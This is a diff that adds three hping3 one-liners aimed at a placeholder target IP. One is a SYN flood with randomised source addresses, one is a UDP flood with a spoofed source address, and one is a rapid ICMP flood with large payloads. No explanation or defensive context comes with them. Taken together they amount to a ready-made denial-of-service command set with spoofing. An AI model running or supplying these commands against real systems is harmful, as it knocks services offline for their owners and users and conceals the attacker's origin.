@@ -1,0 +1,7 @@
+hping3 --flood -c 10000 -S --rand-source <TARGET_IP_ADDRESS> -d 0 --verbose
+
+
+hping3 --udp -c 9000 -w 64 -d 1 --spoof <SPOOFED_IP_ADDRESS> <TARGET_IP_ADDRESS> --verbose
+
+
+hping3 --icmp -c 11000 -d 1024 --interval 0.0133 <TARGET_IP_ADDRESS> --verbose
